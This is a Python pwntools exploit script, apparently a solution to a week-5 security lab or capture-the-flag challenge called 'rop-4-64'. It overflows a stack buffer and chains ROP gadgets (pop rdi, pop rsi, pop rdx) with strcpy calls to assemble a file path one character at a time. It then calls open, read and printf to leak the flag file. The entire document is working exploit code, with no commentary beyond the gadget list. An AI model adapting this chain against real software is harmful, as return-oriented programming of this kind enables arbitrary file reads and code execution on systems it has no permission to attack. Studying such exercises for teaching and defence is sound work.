#!/usr/bin/env python
from pwn import *

p = process("./rop-4-64")

open_func = p.elf.symbols['open']
read_func = p.elf.symbols['read']
print_func = p.elf.symbols['printf']
strcpy = p64(0x4006e2)
pop_1 = p64(0x400863)
pop_2 = p64(0x400861)
pop_3 = p64(0x40073f)
src = 0x400890
src2 = 0x4008c0
dest = 0x601800


"""
0x0000000000400863 : pop rdi ; ret
0x0000000000400861 : pop rsi ; pop r15 ; ret
0x000000000040073f : pop rdx ; nop ; pop rbp ; ret
building /home/labs/week5/rop-4-64/flag
"""

aslash = p64(0x400908)
lh = p64(src + 1)
lo = p64(src + 12)
lm = p64(src + 22)
le = p64(src + 2)
ll = p64(src + 35)
la = p64(src + 36)
lb = p64(src + 10)
ls = p64(src + 24)
lw = p64(src + 13)
lk = p64(src + 8)
lr = p64(src + 11)
lp = p64(src + 23)
lf = p64(src + 16)
lg = p64(src + 42)
num6 = p64(src2 + 30)
num5 = p64(src2 + 29)
num4 = p64(src2 + 28)
dash = p64(src2 + 35)
nullterm = p64(src + 44)

buf = "A" * 0x80 + "BBBBBBBB"

buf += pop_1
buf += p64(dest)
buf += pop_2
buf += aslash
buf += p64(0)
buf += strcpy

buf += pop_1
buf += p64(dest + 1)
buf += pop_2
buf += lh
buf += p64(0)
buf += strcpy

buf += pop_1
buf += p64(dest + 2)
buf += pop_2
buf += lo
buf += p64(0)
buf += strcpy

buf += pop_1
buf += p64(dest + 3)
buf += pop_2
buf += lm
buf += p64(0)
buf += strcpy

buf += pop_1
buf += p64(dest + 4)
buf += pop_2
buf += le
buf += p64(0)
buf += strcpy

buf += pop_1
buf += p64(dest + 5)
buf += pop_2
buf += aslash
buf += p64(0)
buf += strcpy

buf += pop_1
buf += p64(dest + 6)
buf += pop_2
buf += ll
buf += p64(0)
buf += strcpy

buf += pop_1
buf += p64(dest + 7)
buf += pop_2
buf += la
buf += p64(0)
buf += strcpy

buf += pop_1
buf += p64(dest + 8)
buf += pop_2
buf += lb
buf += p64(0)
buf += strcpy

buf += pop_1
buf += p64(dest + 9)
buf += pop_2
buf += ls
buf += p64(0)
buf += strcpy

buf += pop_1
buf += p64(dest + 10)
buf += pop_2
buf += aslash
buf += p64(0)
buf += strcpy

buf += pop_1
buf += p64(dest + 11)
buf += pop_2
buf += lw
buf += p64(0)
buf += strcpy

buf += pop_1
buf += p64(dest + 12)
buf += pop_2
buf += le
buf += p64(0)
buf += strcpy

buf += pop_1
buf += p64(dest + 13)
buf += pop_2
buf += le
buf += p64(0)
buf += strcpy

buf += pop_1
buf += p64(dest + 14)
buf += pop_2
buf += lk
buf += p64(0)
buf += strcpy

buf += pop_1
buf += p64(dest + 15)
buf += pop_2
buf += num5
buf += p64(0)
buf += strcpy

buf += pop_1
buf += p64(dest + 16)
buf += pop_2
buf += aslash
buf += p64(0)
buf += strcpy

buf += pop_1
buf += p64(dest + 17)
buf += pop_2
buf += lr
buf += p64(0)
buf += strcpy

buf += pop_1
buf += p64(dest + 18)
buf += pop_2
buf += lo
buf += p64(0)
buf += strcpy

buf += pop_1
buf += p64(dest + 19)
buf += pop_2
buf += lp
buf += p64(0)
buf += strcpy

buf += pop_1
buf += p64(dest + 20)
buf += pop_2
buf += dash
buf += p64(0)
buf += strcpy

buf += pop_1
buf += p64(dest + 21)
buf += pop_2
buf += num4
buf += p64(0)
buf += strcpy

buf += pop_1
buf += p64(dest + 22)
buf += pop_2
buf += dash
buf += p64(0)
buf += strcpy

buf += pop_1
buf += p64(dest + 23)
buf += pop_2
buf += num6
buf += p64(0)
buf += strcpy

buf += pop_1
buf += p64(dest + 24)
buf += pop_2
buf += num4
buf += p64(0)
buf += strcpy

buf += pop_1
buf += p64(dest + 25)
buf += pop_2
buf += aslash
buf += p64(0)
buf += strcpy

buf += pop_1
buf += p64(dest + 26)
buf += pop_2
buf += lf
buf += p64(0)
buf += strcpy

buf += pop_1
buf += p64(dest + 27)
buf += pop_2
buf += ll
buf += p64(0)
buf += strcpy

buf += pop_1
buf += p64(dest + 28)
buf += pop_2
buf += la
buf += p64(0)
buf += strcpy

buf += pop_1
buf += p64(dest + 29)
buf += pop_2
buf += lg
buf += p64(0)
buf += strcpy

buf += pop_1
buf += p64(dest + 30)
buf += pop_2
buf += nullterm
buf += p64(0)
buf += strcpy


buf += pop_1
buf += p64(dest)
buf += pop_2
buf += p64(0)
buf += p64(0)
buf += pop_3
buf += p64(0)
buf += p64(0)
buf += p64(open_func)

buf += pop_1
buf += p64(3)
buf += pop_2
buf += p64(0x601100)
buf += p64(0)
buf += pop_3
buf += p64(100)
buf += p64(0)
buf += p64(read_func)

buf += pop_1
buf += p64(0x601100)
buf += pop_2
buf += p64(0)
buf += p64(0)
buf += p64(print_func)

p.sendline(buf)
p.interactive()
